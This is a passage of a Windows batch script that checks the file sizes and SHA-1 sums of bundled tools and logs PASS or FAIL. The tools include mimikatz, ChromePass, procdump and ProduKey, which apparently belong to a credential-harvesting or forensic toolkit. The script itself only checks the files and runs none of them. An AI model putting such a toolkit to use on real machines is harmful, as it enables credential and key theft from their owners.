if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
goto the_end_of_time
:DT_Check_File
if "%1"=="" (
if "%CON_DT_LOG%"=="TRUE" @echo No file specified for checking. >> "%CON_DT_LOGFILE%"
)
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" goto DT_Check_File_Sha1Sum
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.dll" goto DT_Check_File_7zdll
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" goto DT_Check_File_7zexe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.sfx" goto DT_Check_File_7zsfx
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7zCon.sfx" goto DT_Check_File_7zcon
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7-zip.dll" goto DT_Check_File_7-zipdll
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" goto DT_Check_File_ChromePassexe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" goto DT_Check_File_ChromePasszip
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" goto DT_Check_File_kappfreedll
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" goto DT_Check_File_mimikatzexe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" goto DT_Check_File_mimikatz_x32zip
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" goto DT_Check_File_mimikatz_x64exe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" goto DT_Check_File_mimikatz_x64zip
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.exe" goto DT_Check_File_procdumpexe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\Procdump\procdump.zip" goto DT_Check_File_procdumpzip
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.exe" goto DT_Check_File_ProduKeyexe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\ProduKey\ProduKey.zip" goto DT_Check_File_ProduKeyzip
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.exe" goto DT_Check_File_ProduKeyx64exe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\ProduKeyx64\ProduKeyx64.zip" goto DT_Check_File_ProduKeyx64zip
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.exe" goto DT_Check_File_Windexe
if %1=="%CON_DT_RES_DIRECTORY_ROOT%\Wind\Wind.zip" goto DT_Check_File_Windzip
goto the_end_of_time
:DT_Check_File_Sha1Sum
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=19968
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_7zdll
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=914432
set VAR_DT_FILE_EXPECT_SHA1SUM=344faf61c3eb76f4a2fb6452e83ed16c9cce73e0
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_7zexe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=163840
set VAR_DT_FILE_EXPECT_SHA1SUM=20fea1314dbed552d5fedee096e2050369172ee1
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_7zsfx
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=162816
set VAR_DT_FILE_EXPECT_SHA1SUM=00654a3562fded9c003a0116e269e8b8f2fa6b39
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_7zcon
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=152064
set VAR_DT_FILE_EXPECT_SHA1SUM=1b81ab29d0033864340f11ab913e6899d1279095
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_7-zipdll
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=55808
set VAR_DT_FILE_EXPECT_SHA1SUM=297e678c34311191c4602b6f4e920362e8a089a4
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_ChromePassexe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=225888
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_ChromePasszip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=136889
set VAR_DT_FILE_EXPECT_SHA1SUM=aeb9a757dbb401d7e9eb9a2cbb6a99814e1bb34c
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_kappfreedll
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=14416
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_mimikatzexe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=121936
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_mimikatz_x32zip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=69446
set VAR_DT_FILE_EXPECT_SHA1SUM=e1cfdcf78e99104f626af9b86435bed29f8e25de
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_mimikatz_x64exe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=141904
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_mimikatz_x64zip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=66484
set VAR_DT_FILE_EXPECT_SHA1SUM=9a5391db5716a7d619958c3c885ace087294d810
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_procdumpexe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=478400
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_procdumpzip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=222876
set VAR_DT_FILE_EXPECT_SHA1SUM=03ec1c36ca074e82322631bc5947117c47ca73ea
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_ProduKeyexe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=77408
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_ProduKeyzip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=40809
set VAR_DT_FILE_EXPECT_SHA1SUM=de5f895d99f3823d445e263618b43b92b3e319fb
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
"%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" %1 > "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt"
findstr /m "%VAR_DT_FILE_EXPECT_SHA1SUM%" "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
if %errorlevel%==1 (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] Sha1sum mismatch in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if %errorlevel%==0 (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] Sha1sum match in file %1 - Expected sum: %VAR_DT_FILE_EXPECT_SHA1SUM% >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_ProduKeyx64exe
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=113248
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
goto the_end_of_time
:DT_Check_File_ProduKeyx64zip
set VAR_DT_FILE_EXPECT_SIZE=
set VAR_DT_FILE_EXPECT_SIZE=55344
set VAR_DT_FILE_EXPECT_SHA1SUM=b113f2f31e2885a83a45536e2f9c5893e18e6452
if not "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [FAIL] File size mismatch in file %1 - File size: %~z1 ,Expected size: %VAR_DT_FILE_EXPECT_SIZE% >> "%CON_DT_LOGFILE%"
set VAR_DT_ERROR_EXIT=TRUE
)
if "%~z1"=="%VAR_DT_FILE_EXPECT_SIZE%" (
if "%CON_DT_LOG%"=="TRUE" @echo [PASS] File %1 size successfully analysed - Expected size: %VAR_DT_FILE_EXPECT_SIZE% ,File size: %~z1 >> "%CON_DT_LOGFILE%"
)
REM SHA1 SUM:
if exist "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" del /f "%CON_DT_RES_DIRECTORY_ROOT%\temp.txt" >nul
